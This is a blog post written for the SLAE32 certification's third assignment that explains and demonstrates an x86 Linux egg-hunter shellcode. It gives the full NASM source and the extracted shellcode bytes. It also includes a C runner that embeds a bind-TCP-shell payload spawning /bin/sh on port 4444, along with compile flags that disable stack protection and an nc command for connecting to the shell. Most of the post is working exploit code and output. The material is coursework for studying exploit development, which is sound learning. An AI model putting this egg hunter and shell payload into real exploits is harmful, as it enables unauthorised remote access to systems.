---
layout: single
title: EGG Hunter Shellcode - SLAE32 Third Exam Assignment 
date: 2020-6-20
classes: wide
header:
  teaser: /images/egg.jpg
tags:

  -SLAE
--- 

## Introduction
Hello Everyone!
This blog post is dedicated to Assignment 3 of the SLAE32 Exam, which is about the EGG Hunter shellcode.


<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/egg.jpg">
</p>

## Assignment 3 - Egg Hunter shellcode

There are 3 main instructions provided to us in this assignment:
- [ ] Studying about the Egg hunter shellcode technique
- [ ] Create a working demo of Egg hunter
- [ ] The code should be configurable for different payloads

## What is Egg Hunter?

**Pseudo code for Egghunter:**

```c
function egghunter(address){
       if (value(address) == <EGG STRING>)) then
                jump_to(address)
       else
                egghunter(address+1)
```
		
Photo representation of Egg hunter usage:

<p align="center"> 
<img src="https://raw.githubusercontent.com/NagliNagli/naglinagli.github.io/master/images/EggHunter.png">
</p>

* Egg hunter is a type of shellcode which represents a two - staged payload.
* The first stage searches all memory ranges for an “egg” which is typically a unique set of 4 bytes,repeated twice - that the hunter can use to identify a section of code.
* The pattern indicates the start of the second stage payload that needs to be executed.

**Why should we use the Egg hunter shellcode technique?**

To execute arbitrary code, an attacker puts his shellcode in the available buffer space.

What if, the shellcode requires more space than the available space in the buffer?
This is where the egg hunter technique is useful.

Egg hunter is a small piece of shellcode which searches for an actual bigger shellcode which the attacker was not able to fit-in the available buffer space and redirect execution flow to it.

## Creating egghunter.nasm

Now, we can create the assembly file going through each main stage.

As per the paper, I will use the shellcode presented with the access syscalls:

- [ ] access syscall (67) - <https://www.man7.org/linux/man-pages/man2/access.2.html>

```c
int access(const char *pathname, int mode);
```
access()  checks  whether the calling process can access the file path‐name. 
If pathname is a symbolic link, it is dereferenced.

The egg size will be 8 bytes as mentioned above, and the search speed is 7.5 seconds (0x0 . . . 0xbfffebd4)

![access](/images/access.png)

### Analysing our assembly code (within the code comments):

The OR instruction is used for supporting logical expression by performing bitwise OR operation. The bitwise OR operator returns 1, if the matching bits from either or both operands are one. It returns 0, if both the bits are zero.

The OR logical operation with 0xfff outputs 0xfff (1111 1111 1111), because any bit OR-ed with 1 is 1.

Increasing 0xfff by 1 outputs 0x1000 = 4096 (PAGE_SIZE). In this way, ecx is incremented 16 Bytes every time this instruction is called.

We divide the proccess into 2 stages inorder to not tackle a NULL-BYTE when encountering the PAGE_SIZE value (0x1000 = 4096)

```bash
_start:
    xor edx, edx        ; zeroing out the EDX register

set_page:
    ;sets EDX register to PAGE_SIZE-1 (4095)
    or dx, 0xfff        ; sets the EDX register to 0xfff;
```

```bash
increase_address:
    inc edx             ; increases the EDX register by one

    ; int access(const char *pathname, int mode);
    lea ebx, [edx+0x4]  ; pathname
    push byte 0x21      ; system call number for access (33 decimal)
    pop eax             ; 0x21 value
    int 0x80            ; calling the syscall, returns 0xfffffff2 on EFAULT.

    cmp al, 0xf2        ; sets the Zero Flag when the comparison is true
    jz set_page       ; jump to set_page when ZF is set (not NULL)
```

```bash
 ; preparing the egghunt
    mov eax, 0x50905090 ; 4-byte egghunter key
    mov edi, edx        ; EDX register contains the memory address of writable page
```

The SCASD instruction is used for searching a particular character or set of characters in a string.
The data item to be searched should be in the EAX register

```bash
; hunts for first 4 bytes of egg; scasd sets ZF when we find the match
    scasd               ; compares [EDI] to value in EAX register, increments EDI register by 4 
    jnz increase_address     ; jumps to inc_address when ZF is not set
    
    ; hunts for last 4 bytes of egg
    scasd               ; hunts for last 4 bytes of egg
    jnz increase_address

    ; jumps to the beginning of the shellcode
    jmp edi

```

The full shellcode:

```bash
; Filename: egghunter.nasm

global _start

section .text
_start:
    xor edx, edx        ; zeroing out the EDX register

set_page:
    ;sets EDX register to PAGE_SIZE-1 (4095)
    or dx, 0xfff        ; sets the EDX register to 0xfff;

increase_address:
    inc edx             ; increases the EDX register by one,

    ; int access(const char *pathname, int mode);
    lea ebx, [edx+0x4]  ; pathname
    push byte 0x21      ; system call number for access (33 decimal)
    pop eax             ; 0x21 value
    int 0x80            ; calling the syscall, returns 0xfffffff2 on EFAULT.

    cmp al, 0xf2        ; sets the Zero Flag when the comparison is true
    jz set_page       ; jump to set_page when ZF is set (not NULL)

    ; preparing the egghunt
    mov eax, 0x50905090 ; 4-byte egghunter key
    mov edi, edx        ; EDX register contains the memory address of writable page
    
    ; hunts for first 4 bytes of egg; scasd sets ZF when we find the match
    scasd               ; compares [EDI] to value in EAX register, increments EDI register by 4 
    jnz increase_address     ; jumps to inc_address when ZF is not set
    
    ; hunts for last 4 bytes of egg
    scasd               ; hunts for last 4 bytes of egg
    jnz increase_address

    ; jumps to the beginning of the shellcode
    jmp edi


```

## Assembling and linking

Now, we have completed writing the egghunter.nasm file.

I will Assemble and link it with the following complie.sh bash script:

```c
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o

echo '[+] Done!'

echo '[+] Printing the Shellcode:'

objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

The shellcode output:

```c
"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";
```

As we can see there are no NULL-BYTES within the shellcode generated.

I will insert the shellcode on the custom shellcode c program runner presented
which will get as input the egghunter shellcode, and the bind shell shellcode:

```c
#include <stdio.h>
#include <string.h>

unsigned char egghunter[] = \

"\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x90\x50\x90\x50\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7";


unsigned char code[] = \

/* The Egg custom bytes: */
"\x50\x90\x50\x90\x50\x90\x50\x90"
/* The shellcode payload: */
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x97\x31\xc0\xb0\x66\x56\x66\x68\x11\x5c\x43\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\x31\xdb\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\xfe\xc3\x56\x56\x57\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Egghunter  Length:  %d\n", strlen(egghunter));
	printf("Shellcode Length:  %d\n", strlen(code));


	int (*ret)() = (int(*)())code;

	ret();

}
```

**Now, the egghunter should spawn the bind tcp shell shellcode which i have created for the first assignment, as we will encounter soon.**

Creating the executable
```bash
gcc shellcode.c -fno-stack-protector -z execstack -o bindegghunter
```

Running the shellcode:
```bash
./bindegghunter
```
Connecting to the infected host

```c
nc -nv 127.0.0.1 4444
```

![bindegghunter](/images/bindegghunter.png)

And thats about it, we have a running bind TCP shell executing /bin/sh on port 4444 using our egghunter shellcode to spawn itself.

Thank you very much for sticking around!

## References

* skape's egghunter paper - <http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf>
* access syscall manual - <https://www.man7.org/linux/man-pages/man2/access.2.html>
* bind tcp shell blogpost - <https://naglinagli.github.io/shellbind/>


## Wrap-Up
This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification

<https://www.pentesteracademy.com/course?id=3>

Student ID: SLAE - 1543

All the source code which i have used throughout the assignment is available here:
<https://github.com/NagliNagli/SLAE/tree/master/Egghunter>

Cheers,
Gal.
